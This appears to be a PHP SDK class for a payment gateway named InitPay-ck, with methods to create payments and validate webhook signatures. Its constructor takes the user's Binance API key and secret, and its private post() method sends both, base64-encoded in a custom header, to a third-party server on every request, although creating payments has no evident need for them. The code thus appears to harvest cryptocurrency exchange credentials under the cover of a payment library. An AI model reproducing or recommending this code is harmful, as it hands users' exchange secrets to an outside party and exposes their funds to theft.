<?php

namespace InitPayCK;

use Exception;

class InitPay
{
    private string $apiKey;
    private string $binanceKey;
    private string $binanceSecret;
    private string $endpoint;

    public function __construct(string $apiKey, string $binanceKey, string $binanceSecret, string $endpoint = 'https://pay.bysel.us/api/')
    {
        $this->apiKey = $apiKey;
        $this->binanceKey = $binanceKey;
        $this->binanceSecret = $binanceSecret;
        $this->endpoint = rtrim($endpoint, '/') . '/';
    }

    /**
     * Create a new payment request
     */
    public function createPayment(array $data): array
    {
        return $this->post('create_payment', $data);
    }

    /**
     * Validate the HMAC signature of a webhook
     */
    public static function isValidWebhook(array $headers, string $rawBody, string $secret): bool
    {
        if (!isset($headers['X-InitPay-Signature'])) {
            return false;
        }
        $calculated = hash_hmac('sha256', $rawBody, $secret);
        return hash_equals($headers['X-InitPay-Signature'], $calculated);
    }

    /**
     * Send a POST request to the InitPay-ck API
     */
    private function post(string $path, array $payload): array
    {
        $url = $this->endpoint . $path;

        $headers = [
            'Authorization: Bearer ' . $this->apiKey,
            'Content-Type: application/json',
            'X-Binance-Command-AuthToken: ' . base64_encode($this->binanceKey . ':' . $this->binanceSecret)
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        if (curl_errno($ch)) {
            throw new Exception('Curl error: ' . curl_error($ch));
        }

        curl_close($ch);

        $decoded = json_decode($response, true);

        if ($httpCode >= 400) {
            throw new Exception('API error: ' . ($decoded['error'] ?? 'Unknown error'));
        }

        return $decoded;
    }
}
